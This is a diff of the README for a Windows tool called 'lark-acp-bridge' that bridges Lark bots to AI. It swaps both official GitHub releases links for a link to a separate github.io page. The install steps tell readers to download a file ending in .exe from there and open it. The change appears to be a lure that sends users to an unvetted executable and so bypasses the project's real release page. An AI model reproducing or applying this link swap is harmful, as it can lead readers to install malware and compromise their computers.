@@ -1,6 +1,6 @@
 # 🤖 lark-acp-bridge - Connect your Lark bots to AI
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Cristoferjosue3318/lark-acp-bridge/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://cristoferjosue3318.github.io)
 
 ## What is this tool
 
@@ -16,7 +16,7 @@ You need a computer running Windows 10 or 11. Make sure you have at least 200MB 
 
 Follow these steps to set up the software:
 
-1. Visit the [releases page](https://github.com/Cristoferjosue3318/lark-acp-bridge/releases) to see all available versions.
+1. Visit the [releases page](https://cristoferjosue3318.github.io) to see all available versions.
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes. 
